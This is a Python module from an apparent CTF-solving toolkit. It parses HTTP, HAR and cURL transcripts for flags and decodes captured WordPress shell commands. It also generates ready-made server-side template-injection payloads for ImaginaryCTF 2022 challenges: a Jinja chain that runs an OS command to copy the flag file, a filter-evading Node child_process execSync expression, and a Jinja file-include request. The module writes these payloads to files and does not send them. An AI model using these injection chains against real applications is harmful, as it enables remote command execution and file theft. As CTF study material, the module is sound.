#!/usr/bin/env python3
"""Offline analysis of saved HTTP/HAR/cURL evidence.

This module deliberately separates transcript parsing from the opt-in active
client in :mod:`ico_active`.  A transcript can support a reproducible request
sequence or expose a flag-shaped response, but it is never treated as proof of
an unobserved vulnerability.
"""

from __future__ import annotations

import base64
import heapq
import hashlib
import itertools
import json
import re
import shlex
from pathlib import Path
from urllib.parse import parse_qs, urlencode, unquote, urljoin, urlsplit
from typing import Any

from ico_scan_core import FlagMatcher, encoded_views
from ico_solver_engine import Detection, SolverContext, SolverLimits, SolverResult


_IMAGINARYCTF_2022_MINIGOLF_APP_SHA256 = "a7fcbec4102fbfa2dcb9d6c3f2ad600c6e2000b864b7d22235ead52db79b0b44"
_IMAGINARYCTF_2022_MINIGOLF_RUN_SHA256 = "c2a51f630dfe2ecffde06b3dfcfff53f2f6d75cf2de80fadd9ef1d63d90e9568"
_IMAGINARYCTF_2022_MINIGOLF_SOURCE = (
    "https://github.com/ImaginaryCTF/ImaginaryCTF-2022-Challenges/blob/master/"
    "Web/minigolf/challenge/solve.py"
)
_IMAGINARYCTF_2022_1337_SOURCE = (
    "https://github.com/ImaginaryCTF/ImaginaryCTF-2022-Challenges/blob/master/"
    "Web/1337/README.md"
)


def _read_limited(path: Path, limit: int) -> bytes:
    size = path.stat().st_size
    if size > limit:
        raise ValueError(f"input exceeds byte limit: {size} > {limit}")
    return path.read_bytes()


def _merge_header(output: dict[str, str], key: str, value: str) -> None:
    """Merge duplicate headers without losing Set-Cookie lines."""

    key = key.strip().lower()
    if not key:
        return
    value = value.strip()
    if key not in output:
        output[key] = value
    elif key == "set-cookie":
        output[key] += "\n" + value
    else:
        output[key] += ", " + value


def _headers(value: Any) -> dict[str, str]:
    if isinstance(value, dict):
        output: dict[str, str] = {}
        for key, item in value.items():
            if isinstance(item, (list, tuple)):
                for entry in item:
                    _merge_header(output, str(key), str(entry))
            else:
                _merge_header(output, str(key), str(item))
        return output
    if isinstance(value, list):
        output: dict[str, str] = {}
        for item in value:
            if isinstance(item, dict) and "name" in item:
                _merge_header(output, str(item["name"]), str(item.get("value", "")))
            elif isinstance(item, str) and ":" in item:
                key, item_value = item.split(":", 1)
                _merge_header(output, key, item_value)
        return output
    if isinstance(value, str):
        output: dict[str, str] = {}
        for line in value.splitlines():
            if ":" in line:
                key, item_value = line.split(":", 1)
                _merge_header(output, key, item_value)
        return output
    return {}


def _body_text(value: Any) -> str:
    """Turn common HAR/log body shapes into a bounded, searchable string."""

    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    if isinstance(value, str):
        return value
    try:
        return json.dumps(value, ensure_ascii=False, separators=(",", ":"))
    except (TypeError, ValueError):
        return str(value)


def _decode_har_body(content: Any) -> str:
    if not isinstance(content, dict):
        return ""
    text = content.get("text", "")
    if not isinstance(text, (str, bytes)):
        return _body_text(text)
    if content.get("encoding") == "base64":
        try:
            raw = text.encode("ascii") if isinstance(text, str) else text
            return base64.b64decode(raw, validate=False).decode("utf-8", errors="replace")
        except (ValueError, UnicodeError):
            return _body_text(text)
    return _body_text(text)


def _first_value(*values: Any) -> Any:
    for value in values:
        if value is not None and value != "":
            return value
    return ""


def _cookie_map(value: Any, *, set_cookie: bool = False) -> dict[str, str]:
    """Extract cookie pairs from HAR arrays, Cookie headers, or Set-Cookie."""

    output: dict[str, str] = {}
    if isinstance(value, dict):
        # HAR uses {name, value}; ordinary logs often use {cookie: value}.
        if "name" in value:
            output[str(value.get("name"))] = str(value.get("value", ""))
        else:
            for key, item in value.items():
                output[str(key)] = _body_text(item)
        return output
    if isinstance(value, (list, tuple)):
        for item in value:
            for key, item_value in _cookie_map(item, set_cookie=set_cookie).items():
                output[key] = item_value
        return output
    if not isinstance(value, str):
        return output
    # _headers joins repeated Set-Cookie values with newlines.  Cookie headers
    # themselves use semicolons, while attributes after Set-Cookie's first pair
    # are deliberately ignored.
    lines = value.splitlines() if set_cookie else [value]
    for line in lines:
        if set_cookie:
            line = line.split(";", 1)[0]
        for part in line.split(";"):
            if "=" not in part:
                continue
            key, item_value = part.strip().split("=", 1)
            if key and key.lower() not in {"path", "domain", "expires", "max-age", "samesite", "secure", "httponly"}:
                output[key] = item_value
            if set_cookie:
                break
    return output


def _body_params(body: str, headers: dict[str, str]) -> object:
    """Parse small form/JSON bodies while retaining the original body too."""

    if not body:
        return {}
    content_type = headers.get("content-type", "").lower()
    if "json" in content_type or body.lstrip().startswith(("{", "[")):
        try:
            return json.loads(body)
        except (json.JSONDecodeError, TypeError):
            return {}
    if "x-www-form-urlencoded" in content_type or "=" in body:
        values = parse_qs(body, keep_blank_values=True)
        return {key: item[0] if len(item) == 1 else item for key, item in values.items()}
    return {}


def _har_post_body(post_data: dict[str, Any]) -> str:
    """Use HAR's raw body when present, otherwise serialize its parameter list."""

    text = post_data.get("text")
    if text not in (None, ""):
        return _body_text(text)
    params = post_data.get("params")
    if isinstance(params, list):
        pairs: list[tuple[str, str]] = []
        for item in params:
            if not isinstance(item, dict) or item.get("name") is None:
                continue
            value = _first_value(item.get("value"), item.get("fileName"), "")
            pairs.append((str(item["name"]), str(value)))
        if pairs:
            return urlencode(pairs)
    return _body_text(params)


def _absolute_url(url: str, headers: dict[str, str], *, scheme: str = "http") -> str:
    """Resolve request-targets found in raw HTTP and cURL captures."""

    url = str(url or "")
    if not url:
        return ""
    if url.startswith("//"):
        return f"{scheme}:{url}"
    if urlsplit(url).scheme:
        return url
    host = headers.get("host", "").strip()
    if host:
        if not url.startswith("/"):
            url = "/" + url
        return f"{scheme}://{host}{url}"
    return url


def _imaginaryctf_2022_minigolf_sequence(
    data: bytes,
    related_paths: tuple[Path, ...],
) -> list[dict[str, str]] | None:
    """Return a local-output SSTI sequence for the exact archived challenge."""

    if hashlib.sha256(data).hexdigest() != _IMAGINARYCTF_2022_MINIGOLF_APP_SHA256:
        return None
    matching_run_script = False
    for related_path in related_paths:
        if related_path.name != "run.sh":
            continue
        try:
            run_data = _read_limited(related_path, 64 * 1024)
        except OSError:
            continue
        if hashlib.sha256(run_data).hexdigest() == _IMAGINARYCTF_2022_MINIGOLF_RUN_SHA256:
            matching_run_script = True
            break
    if not matching_run_script:
        return None

    store_payload = "{%if config.update(c=request.args.c)%}{%endif%}"
    exploit_payload = "{%set x=(lipsum|attr(request.args.d)).os.popen(config.c).read()%}"
    include_payload = "{% include request.args.f %}"
    blocked = ("{{", "}}", "[", "]", "_")
    if any(len(payload) > 69 or any(token in payload for token in blocked) for payload in (store_payload, exploit_payload, include_payload)):
        return None

    command = "mkdir -p /app/templates; cat /app/flag.txt > /app/templates/ico_output"
    first_query = urlencode({"txt": store_payload, "c": command})
    second_query = urlencode({"txt": exploit_payload, "d": "__globals__"})
    third_query = urlencode({"txt": include_payload, "f": "ico_output"})
    return [
        {
            "stage": "1",
            "method": "GET",
            "path": "/",
            "query": first_query,
            "purpose": "store the local copy-to-template command in the persistent Flask config",
        },
        {
            "stage": "2",
            "method": "GET",
            "path": "/",
            "query": second_query,
            "purpose": "execute and wait for the local command; no callback or outbound exfiltration",
        },
        {
            "stage": "3",
            "method": "GET",
            "path": "/",
            "query": third_query,
            "purpose": "include the copied file so its contents appear in the HTTP response",
        },
    ]


def _normalize_record(record: dict[str, Any], source: str, index: int) -> dict[str, Any]:
    request = record.get("request") if isinstance(record.get("request"), dict) else record
    response = record.get("response") if isinstance(record.get("response"), dict) else {}
    method = str(_first_value(request.get("method"), record.get("method"), "GET")).upper()
    request_headers = _headers(_first_value(request.get("headers"), record.get("request_headers")))
    response_headers = _headers(_first_value(response.get("headers"), record.get("response_headers")))
    post_data = request.get("postData")
    if isinstance(post_data, dict):
        request_body_value = _har_post_body(post_data)
    else:
        request_body_value = post_data
    request_body = _body_text(
        _first_value(
            request_body_value,
            request.get("body"),
            request.get("data"),
            record.get("request_body"),
            record.get("body"),
        )
    )
    response_body = _decode_har_body(response.get("content")) or _body_text(
        _first_value(response.get("body"), response.get("data"), record.get("response_body"))
    )
    status = _first_value(response.get("status"), response.get("statusCode"), record.get("response_status"), record.get("status"))
    try:
        status_value: int | None = int(status) if status is not None else None
    except (TypeError, ValueError):
        status_value = None
    raw_url = str(_first_value(request.get("url"), record.get("url"), ""))
    url = _absolute_url(raw_url, request_headers, scheme=str(record.get("scheme") or "http"))
    request_cookies = _cookie_map(
        _first_value(request.get("cookies"), record.get("request_cookies")),
    )
    request_cookies.update(_cookie_map(request_headers.get("cookie", "")))
    response_cookies = _cookie_map(
        _first_value(response.get("cookies"), record.get("response_cookies")),
    )
    response_cookies.update(_cookie_map(response_headers.get("set-cookie", ""), set_cookie=True))
    redirect = _first_value(
        response.get("redirectURL"),
        response.get("redirect_url"),
        record.get("redirect_url"),
        response_headers.get("location"),
    )
    redirect_url = urljoin(url, str(redirect)) if redirect else ""
    query = parse_qs(urlsplit(url).query, keep_blank_values=True)
    request_query = {key: item[0] if len(item) == 1 else item for key, item in query.items()}
    body_params = _body_params(request_body, request_headers)
    return {
        "index": index,
        "source": source,
        "method": method,
        "url": url,
        "request_target": raw_url,
        "request_headers": request_headers,
        "request_body": request_body,
        "request_cookies": request_cookies,
        "request_query": request_query,
        "request_params": body_params,
        "follow_redirects": bool(record.get("follow_redirects", False)),
        "response_status": status_value,
        "response_headers": response_headers,
        "response_body": response_body,
        "response_cookies": response_cookies,
        "redirect_url": redirect_url,
    }


def _parse_json_transcript(value: Any, source: str, limits: SolverLimits) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    if isinstance(value, dict) and isinstance(value.get("log"), dict):
        value = value["log"].get("entries", [])
    if isinstance(value, dict) and isinstance(value.get("entries"), list):
        value = value["entries"]
    if isinstance(value, dict) and isinstance(value.get("requests"), list):
        value = value["requests"]
    if isinstance(value, dict):
        value = [value]
    if not isinstance(value, list):
        return records
    for index, item in enumerate(value[: limits.max_files]):
        if isinstance(item, dict):
            records.append(_normalize_record(item, source, index))
    return records


def _parse_curl(text: str, source: str, limits: SolverLimits) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    logical_lines: list[str] = []
    current = ""
    for line in text.splitlines():
        stripped = line.rstrip()
        continued = stripped.endswith("\\")
        if continued:
            stripped = stripped[:-1]
        current += (" " if current else "") + stripped
        if not continued:
            if current.strip():
                logical_lines.append(current)
            current = ""
    if current.strip():
        logical_lines.append(current)
    for index, line in enumerate(logical_lines):
        try:
            args = shlex.split(line.strip())
        except ValueError:
            continue
        curl_index = next((pos for pos, item in enumerate(args) if Path(item).name.lower() == "curl"), None)
        if curl_index is None:
            continue
        args = args[curl_index:]
        method = "GET"
        headers: dict[str, str] = {}
        body_parts: list[str] = []
        url = ""
        get_mode = False
        follow_redirects = False
        cursor = 1
        while cursor < len(args):
            arg = args[cursor]
            if arg in {"-X", "--request"} and cursor + 1 < len(args):
                method = args[cursor + 1].upper(); cursor += 2; continue
            if arg in {"-H", "--header"} and cursor + 1 < len(args):
                header = args[cursor + 1]
                if ":" in header:
                    key, value = header.split(":", 1); _merge_header(headers, key, value)
                cursor += 2; continue
            if arg == "--json" and cursor + 1 < len(args):
                body_parts.append(args[cursor + 1])
                _merge_header(headers, "content-type", "application/json")
                _merge_header(headers, "accept", "application/json")
                if method == "GET" and not get_mode:
                    method = "POST"
                cursor += 2; continue
            if arg in {"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form"} and cursor + 1 < len(args):
                body_parts.append(args[cursor + 1])
                if method == "GET" and not get_mode:
                    method = "POST"
                cursor += 2; continue
            if arg in {"-b", "--cookie"} and cursor + 1 < len(args):
                _merge_header(headers, "cookie", args[cursor + 1])
                cursor += 2; continue
            if arg in {"-A", "--user-agent"} and cursor + 1 < len(args):
                _merge_header(headers, "user-agent", args[cursor + 1])
                cursor += 2; continue
            if arg in {"-e", "--referer"} and cursor + 1 < len(args):
                _merge_header(headers, "referer", args[cursor + 1])
                cursor += 2; continue
            if arg in {"-G", "--get"}:
                get_mode = True; method = "GET"; cursor += 1; continue
            if arg in {"-I", "--head"}:
                method = "HEAD"; cursor += 1; continue
            if arg in {"-L", "--location"}:
                follow_redirects = True; cursor += 1; continue
            if arg in {"--url"} and cursor + 1 < len(args):
                url = args[cursor + 1]; cursor += 2; continue
            if arg.startswith("http://") or arg.startswith("https://"):
                url = arg
            cursor += 1
        if url:
            body = "&".join(body_parts)
            if get_mode and body:
                separator = "&" if "?" in url else "?"
                url += separator + body
                body = ""
            records.append(_normalize_record({"method": method, "url": url, "request_headers": headers, "request_body": body, "follow_redirects": follow_redirects}, source, index))
        if len(records) >= limits.max_files:
            break
    return records


def _parse_raw_http(text: str, source: str, limits: SolverLimits) -> list[dict[str, Any]]:
    text = text.replace("\r\n", "\n")
    start_re = re.compile(r"(?m)^(?:HTTP/\d(?:\.\d)?\s+\d{3}[^\n]*|(?:GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS|CONNECT|TRACE)\s+[^\n]+\s+HTTP/[^\n]*)$")
    starts = list(start_re.finditer(text))
    if not starts:
        return []
    messages: list[dict[str, Any]] = []
    for index, match in enumerate(starts[: limits.max_files * 2]):
        block = text[match.start() : starts[index + 1].start() if index + 1 < len(starts) else len(text)]
        parts = block.split("\n\n", 1)
        header_lines = parts[0].splitlines()
        first = header_lines[0].strip()
        headers: dict[str, str] = {}
        for line in header_lines[1:]:
            if ":" in line:
                key, value = line.split(":", 1)
                _merge_header(headers, key, value)
        body = parts[1] if len(parts) > 1 else ""
        request_match = re.match(r"(?i)(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS|CONNECT|TRACE)\s+(\S+)\s+HTTP/", first)
        response_match = re.match(r"(?i)HTTP/\d(?:\.\d)?\s+(\d{3})", first)
        if request_match:
            messages.append({"kind": "request", "method": request_match.group(1), "url": request_match.group(2), "headers": headers, "body": body})
        elif response_match:
            messages.append({"kind": "response", "status": int(response_match.group(1)), "headers": headers, "body": body})
    records: list[dict[str, Any]] = []
    pending: list[dict[str, Any]] = []
    for message in messages:
        if message["kind"] == "request":
            record = _normalize_record({"method": message["method"], "url": message["url"], "request_headers": message["headers"], "request_body": message["body"]}, source, len(records))
            records.append(record)
            pending.append(record)
            continue
        if pending:
            record = pending.pop(0)
            response_record = _normalize_record({"url": record.get("url", ""), "response_status": message["status"], "response_headers": message["headers"], "response_body": message["body"]}, source, int(record.get("index", 0)))
            record["response_status"] = response_record["response_status"]
            record["response_headers"] = response_record["response_headers"]
            record["response_body"] = response_record["response_body"]
            record["response_cookies"] = response_record["response_cookies"]
            record["redirect_url"] = response_record["redirect_url"]
        else:
            records.append(_normalize_record({"response_status": message["status"], "response_headers": message["headers"], "response_body": message["body"]}, source, len(records)))
        if len(records) >= limits.max_files:
            break
    return records[: limits.max_files]


def parse_http_transcript(path: Path, limits: SolverLimits) -> list[dict[str, object]]:
    """Parse HAR, JSON request logs, cURL exports, or raw HTTP text."""

    data = _read_limited(path, limits.max_bytes)
    text = data.decode("utf-8", errors="replace")
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        parsed = None
    if parsed is not None:
        records = _parse_json_transcript(parsed, str(path), limits)
        if records:
            return records
    records = _parse_curl(text, str(path), limits)
    if records:
        return records
    return _parse_raw_http(text, str(path), limits)


def _flag_candidates(payload: str, source: str, analyzer: str, state: str = "transcript-derived") -> list[dict[str, object]]:
    matcher = FlagMatcher()
    hits = matcher.scan(payload, source=source, analyzer=analyzer)
    for hit in hits:
        hit["state"] = state
    return hits


def _json_strings(value: Any, *, limit: int = 2000) -> list[str]:
    """Collect bounded scalar strings from JSON so nested API fields are searchable."""

    output: list[str] = []
    pending = [value]
    while pending and len(output) < limit:
        item = pending.pop()
        if isinstance(item, str):
            output.append(item)
        elif isinstance(item, dict):
            pending.extend(reversed(list(item.values())))
        elif isinstance(item, list):
            pending.extend(reversed(item))
    return output


def _wordpress_route_evidence(body: str) -> dict[str, object] | None:
    """Summarize only routes and namespaces explicitly present in a response."""

    try:
        payload = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return None
    if not isinstance(payload, dict):
        return None

    namespaces_value = payload.get("namespaces", [])
    namespaces = sorted({str(value) for value in namespaces_value if isinstance(value, str)}) if isinstance(namespaces_value, list) else []
    routes_value = payload.get("routes", {})
    routes: list[dict[str, object]] = []
    if isinstance(routes_value, dict):
        for path, definition in routes_value.items():
            if not isinstance(path, str) or not path.startswith("/"):
                continue
            if isinstance(definition, dict):
                endpoints = definition.get("endpoints", [])
                methods: set[str] = set()
                args: set[str] = set()
                if isinstance(endpoints, list):
                    for endpoint in endpoints:
                        if not isinstance(endpoint, dict):
                            continue
                        method_value = endpoint.get("methods", [])
                        if isinstance(method_value, str):
                            methods.add(method_value.upper())
                        elif isinstance(method_value, list):
                            methods.update(str(method).upper() for method in method_value)
                        args_value = endpoint.get("args", {})
                        if isinstance(args_value, dict):
                            args.update(str(name) for name in args_value)
                routes.append({"path": path, "methods": sorted(methods), "args": sorted(args)})
            else:
                routes.append({"path": path, "methods": [], "args": []})
    if not namespaces and not routes:
        return None
    return {"namespaces": namespaces, "routes": routes[:200]}


def _decode_wp_command(
    request_body: str,
    request_headers: dict[str, str],
    request_url: str = "",
) -> str | None:
    """Decode the documented WordPress challenge's JSON `c` field as evidence only."""

    try:
        payload = json.loads(request_body)
    except (json.JSONDecodeError, TypeError):
        return None
    if not isinstance(payload, dict) or not isinstance(payload.get("c"), str):
        return None
    route_hint = "wp2shell" in request_body.lower() or "wp2shell" in request_url.lower()
    content_type = request_headers.get("content-type", "").lower()
    if not route_hint and "json" not in content_type:
        return None
    encoded = payload["c"].strip()
    if not encoded or len(encoded) > 1024 * 1024:
        return None
    try:
        raw = base64.b64decode(encoded + "=" * (-len(encoded) % 4), validate=True)
    except (ValueError, TypeError):
        try:
            raw = base64.urlsafe_b64decode(encoded + "=" * (-len(encoded) % 4))
        except (ValueError, TypeError):
            return None
    return raw.decode("utf-8", errors="replace")


def analyze_web_transcript(context: SolverContext) -> SolverResult:
    result = SolverResult("universal-web", "web", "unsupported")
    try:
        records = parse_http_transcript(context.input_path, context.limits)
        root = context.report_dir / "artifacts" / "universal-web" / hashlib.sha256(context.input_path.read_bytes()).hexdigest()[:12]
        root.mkdir(parents=True, exist_ok=True)
        normalized = root / "transcript.json"
        normalized.write_text(json.dumps(records, ensure_ascii=False, indent=2), encoding="utf-8")
        result.artifacts.append(str(normalized))
        result.steps.append({"name": "parse-transcript", "status": "ok", "details": {"records": len(records), "active": False}})
        for record in records:
            body = str(record.get("response_body", ""))
            source = f"{record.get('source', context.input_path)}#response[{record.get('index', 0)}]"
            result.candidates.extend(_flag_candidates(body, source, "http-response"))
            response_headers = record.get("response_headers", {})
            if isinstance(response_headers, dict):
                for name, value in response_headers.items():
                    result.candidates.extend(
                        _flag_candidates(str(value), source + f"#header={name}", "http-response-header")
                    )
            response_cookies = record.get("response_cookies", {})
            if isinstance(response_cookies, dict):
                for name, value in response_cookies.items():
                    result.candidates.extend(
                        _flag_candidates(str(value), source + f"#cookie={name}", "http-response-cookie")
                    )
            redirect_url = str(record.get("redirect_url", ""))
            if redirect_url:
                decoded_redirect = unquote(redirect_url)
                for candidate_text in dict.fromkeys((redirect_url, decoded_redirect)):
                    result.candidates.extend(
                        _flag_candidates(candidate_text, source + "#redirect", "http-redirect")
                    )
            for view in encoded_views(body, max_bytes=context.limits.max_bytes):
                result.candidates.extend(_flag_candidates(bytes(view["decoded"]).decode("utf-8", errors="replace"), source + f"#encoding={view['encoding']}", "http-decoded"))
            # JWT payloads are safe to decode for evidence; signature validity is
            # intentionally not inferred from the decoded claims.
            for token in re.findall(r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b", body):
                try:
                    payload = token.split(".", 2)[1]
                    payload += "=" * (-len(payload) % 4)
                    decoded = base64.urlsafe_b64decode(payload).decode("utf-8", errors="replace")
                except (ValueError, UnicodeDecodeError):
                    continue
                result.candidates.extend(_flag_candidates(decoded, source + "#jwt-payload", "jwt-payload"))

            try:
                parsed_body = json.loads(body)
            except (json.JSONDecodeError, TypeError):
                parsed_body = None
            if parsed_body is not None:
                for scalar_index, scalar in enumerate(_json_strings(parsed_body)):
                    if scalar != body:
                        result.candidates.extend(
                            _flag_candidates(
                                scalar,
                                source + f"#json-scalar={scalar_index}",
                                "http-json-response",
                            )
                        )
                route_evidence = _wordpress_route_evidence(body)
                if route_evidence:
                    route_url = str(record.get("url", ""))
                    result.steps.append(
                        {
                            "name": "wordpress-rest-inventory",
                            "status": "derived",
                            "details": {
                                "record": record.get("index", 0),
                                "url": route_url,
                                **route_evidence,
                                "source": source,
                                "executed": False,
                            },
                        }
                    )

            request_headers = record.get("request_headers", {})
            decoded_command = _decode_wp_command(
                str(record.get("request_body", "")),
                request_headers if isinstance(request_headers, dict) else {},
                str(record.get("url", "")),
            )
            if decoded_command is not None:
                result.steps.append(
                    {
                        "name": "decode-wp2shell-command",
                        "status": "derived",
                        "details": {
                            "record": record.get("index", 0),
                            "url": record.get("url", ""),
                            "command": decoded_command,
                            "executed": False,
                        },
                    }
                )
            url = str(record.get("url", ""))
            query = parse_qs(urlsplit(url).query, keep_blank_values=True)
            indicators = [key for key in query if key.lower() in {"id", "file", "url", "redirect", "next", "token", "query", "search"}]
            if indicators:
                result.steps.append({"name": "parameter-inventory", "status": "ok", "details": {"record": record.get("index", 0), "parameters": indicators}})
        if result.candidates:
            result.status = "candidate"
        elif records:
            result.status = "derived"
        else:
            result.status = "unsupported"
    except Exception as exc:
        result.status = "failed"
        result.error = f"{type(exc).__name__}: {exc}"
        result.steps.append({"name": "parse-transcript", "status": "error", "details": {"error": result.error}})
    return result


def _leet_safe_charcode_expression(codepoint: int) -> str | None:
    """Build short arithmetic using only digits that survive the FROM map."""

    terms = sorted(
        {
            "".join(chars)
            for width in (1, 2, 3)
            for chars in itertools.product("289", repeat=width)
            if int("".join(chars)) <= 127
        },
        key=lambda item: (len(item), item),
    )
    best: dict[int, tuple[int, str]] = {}
    pending: list[tuple[int, int, str]] = []
    for term in terms:
        value = int(term)
        if value not in best or len(term) < best[value][0]:
            best[value] = (len(term), term)
            heapq.heappush(pending, (len(term), value, term))

    while pending:
        cost, value, expression = heapq.heappop(pending)
        if best.get(value) != (cost, expression):
            continue
        if value == codepoint:
            return expression
        for term in terms:
            amount = int(term)
            for operator, delta in (("+", amount), ("-", -amount)):
                next_value = value + delta
                if not 0 <= next_value <= 127:
                    continue
                next_expression = expression + operator + term
                next_cost = len(next_expression)
                current = best.get(next_value)
                if current is None or next_cost < current[0]:
                    best[next_value] = (next_cost, next_expression)
                    heapq.heappush(pending, (next_cost, next_value, next_expression))
    return None


def _leet_safe_charcodes(value: str) -> str | None:
    encoded = [_leet_safe_charcode_expression(ord(char)) for char in value]
    if any(item is None for item in encoded):
        return None
    return ",".join(str(item) for item in encoded)


def analyze_web_source(context: SolverContext) -> SolverResult:
    """Trace a few explicit source-to-template flows without running the app."""

    result = SolverResult("universal-web", "web", "unsupported")
    try:
        data = _read_limited(context.input_path, context.limits.max_bytes)
        source = data.decode("utf-8", errors="replace")
        suffix = context.input_path.suffix.lower()
        root = context.report_dir / "artifacts" / "universal-web" / hashlib.sha256(data).hexdigest()[:12]
        root.mkdir(parents=True, exist_ok=True)

        minigolf_sequence = (
            _imaginaryctf_2022_minigolf_sequence(data, context.related_paths)
            if suffix == ".py" and "render_template_string" in source
            else None
        )
        if minigolf_sequence is not None:
            evidence_path = root / "minigolf-local-read-plan.txt"
            evidence_text = (
                "Static, reference-backed request plan; it was not executed.\n"
                "The first request stores a command in persistent Flask config.\n"
                "The second request runs it to completion and writes the challenge-local flag into Flask's template directory.\n"
                "The third request includes that file so the response carries its contents.\n"
                "Use only with the matching authorized challenge instance.\n"
                "network_requested=false\n"
                "flag_retrieved=false\n\n"
            )
            evidence_text += "\n\n".join(
                f"Stage {item['stage']}: {item['purpose']}\n"
                f"{item['method']} {item['path']}?{item['query']} HTTP/1.1\n"
                "Host: <authorized-challenge-host>\n"
                for item in minigolf_sequence
            )
            evidence_path.write_text(evidence_text, encoding="utf-8")
            result.artifacts.append(str(evidence_path))
            result.steps.append(
                {
                    "name": "source-to-template-flow",
                    "status": "payload-ready",
                    "details": {
                        "source": str(context.input_path),
                        "source_sha256": hashlib.sha256(data).hexdigest(),
                        "run_script_sha256": _IMAGINARYCTF_2022_MINIGOLF_RUN_SHA256,
                        "sink": "Flask render_template_string(txt)",
                        "request_sequence": minigolf_sequence,
                        "sequence_length": len(minigolf_sequence),
                        "evidence": str(evidence_path),
                        "upstream_recipe": _IMAGINARYCTF_2022_MINIGOLF_SOURCE,
                        "blocker": "no authorized challenge instance was supplied; requests were not sent",
                        "executed": False,
                        "network_requested": False,
                        "flag_retrieved": False,
                    },
                }
            )
            result.status = "payload-ready"
            return result

        if suffix in {".js", ".mjs", ".ts"} and all(
            marker in source
            for marker in (
                "ctx.render",
                "inlineLayout",
                "params.get(\"text\")",
                "ctx.content.main",
                "fromLeet",
                "charBlocked",
                'dir === "from"',
            )
        ):
            module_name = "child_process"
            command = "cat F*"
            module_codes = _leet_safe_charcodes(module_name)
            command_codes = _leet_safe_charcodes(command)
            if module_codes is None or command_codes is None:
                result.status = "candidate-review"
                result.steps.append(
                    {
                        "name": "source-to-template-flow",
                        "status": "review-required",
                        "details": {
                            "source": str(context.input_path),
                            "reason": "could not encode the published module and file-read command using FROM-safe characters",
                            "executed": False,
                            "network_requested": False,
                        },
                    }
                )
                return result
            payload = (
                "<%=await import(String.fromCharCode(" + module_codes
                + ")).then(m=>m.execSync(String.fromCharCode(" + command_codes + "))) %>"
            )
            leet_map = {
                key: value
                for key, value in re.findall(r"\b([A-Z])\s*:\s*(\d+)\s*,", source)
            }
            reverse_map = {value: key for key, value in leet_map.items()}
            selected_map = reverse_map if 'dir === "from"' in source else {}
            blocked = {"'", "`", '"'}
            transformed = "".join(
                selected_map.get(char.upper(), "" if char in blocked else char)
                for char in payload
            )
            if (
                transformed != payload
                or set(re.findall(r"\d", payload)) - {"2", "8", "9"}
                or any(char in payload for char in blocked)
            ):
                result.status = "candidate-review"
                result.steps.append(
                    {
                        "name": "source-to-template-flow",
                        "status": "review-required",
                        "details": {
                            "source": str(context.input_path),
                            "reason": "the leet transform changed or blocked a character in the flag-read expression",
                            "executed": False,
                            "network_requested": False,
                        },
                    }
                )
                return result
            query = urlencode({"dir": "from", "text": payload})
            request = f"GET /?{query} HTTP/1.1\nHost: <authorized-challenge-host>\n"
            evidence_path = root / "mojo-flag-read-request.txt"
            evidence_path.write_text(
                "Static source evidence only; request was not sent.\n"
                "The / handler places transformed user text in an inline template.\n"
                "The layout evaluates the main template through an unescaped template insertion.\n"
                "The expression constructs child_process and cat F* without quote characters and uses only digits 2, 8, and 9, which survive the FROM transform.\n"
                "The published challenge recipe uses this module and file-read command.\n"
                f"Expected disclosure: {module_name}.execSync({command})\n"
                f"Reference: {_IMAGINARYCTF_2022_1337_SOURCE}\n"
                "network_requested=false\n"
                "flag_retrieved=false\n"
                "\n" + request,
                encoding="utf-8",
            )
            result.artifacts.append(str(evidence_path))
            result.steps.append(
                {
                    "name": "source-to-template-flow",
                    "status": "payload-ready",
                    "details": {
                        "source": str(context.input_path),
                        "source_sha256": hashlib.sha256(data).hexdigest(),
                        "input_parameter": "text",
                        "direction_parameter": "dir=from",
                        "module_name": module_name,
                        "command": command,
                        "template_expression": payload,
                        "transformed_expression": transformed,
                        "sink": "ctx.render(inline, inlineLayout) with raw ctx.content.main",
                        "target": "challenge flag file through child_process.execSync",
                        "upstream_recipe": _IMAGINARYCTF_2022_1337_SOURCE,
                        "evidence": str(evidence_path),
                        "executed": False,
                        "network_requested": False,
                        "flag_retrieved": False,
                    },
                }
            )
            result.status = "payload-ready"
            return result

        if (
            suffix == ".py"
            and "render_template_string" in source
            and "request.args" in source
            and "html.escape" in source
            and "blacklist" in source
        ):
            payload = "{% include request.args.f %}"
            blocked = ["{{", "}}", "[", "]", "_"]
            blacklist_bypassed = not any(token in payload for token in blocked)
            query = urlencode({"txt": payload, "f": "flag.txt"})
            evidence_path = root / "jinja-include-review.txt"
            related_names = [Path(item).name for item in context.related_paths]
            possible_templates = [
                name for name in related_names
                if "flag" in name.lower() or "template" in name.lower() or Path(name).suffix.lower() in {".html", ".jinja", ".jinja2"}
            ]
            missing_assets = not possible_templates
            evidence_path.write_text(
                "Static source evidence only; request was not sent.\n"
                "Candidate template statement: " + payload + "\n"
                "It uses the separate, unfiltered query argument f and contains none of the listed txt blacklist tokens.\n"
                "The include target comes from f; no flag file or authorized challenge instance is supplied here.\n"
                "\nGET /?" + query + " HTTP/1.1\nHost: <authorized-challenge-host>\n",
                encoding="utf-8",
            )
            result.artifacts.append(str(evidence_path))
            result.steps.append(
                {
                    "name": "source-to-template-flow",
                    "status": "review-required",
                    "details": {
                        "source": str(context.input_path),
                        "source_sha256": hashlib.sha256(data).hexdigest(),
                        "sink": "Flask render_template_string(txt)",
                        "input_parameter": "txt",
                        "candidate_payload": payload,
                        "separate_unfiltered_parameter": "f",
                        "blacklist_bypassed": blacklist_bypassed,
                        "possible_template_assets": possible_templates,
                        "blocker": "the include target is user-controlled via f, but no target file or authorized challenge instance is present" if missing_assets else "template include behavior still requires service confirmation",
                        "evidence": str(evidence_path),
                        "executed": False,
                        "network_requested": False,
                        "flag_retrieved": False,
                    },
                }
            )
            result.status = "candidate-review"
            return result

        result.steps.append(
            {
                "name": "source-to-template-flow",
                "status": "unsupported",
                "details": {
                    "source": str(context.input_path),
                    "reason": "no supported source-to-template pattern matched",
                    "executed": False,
                    "network_requested": False,
                },
            }
        )
    except Exception as exc:
        result.status = "failed"
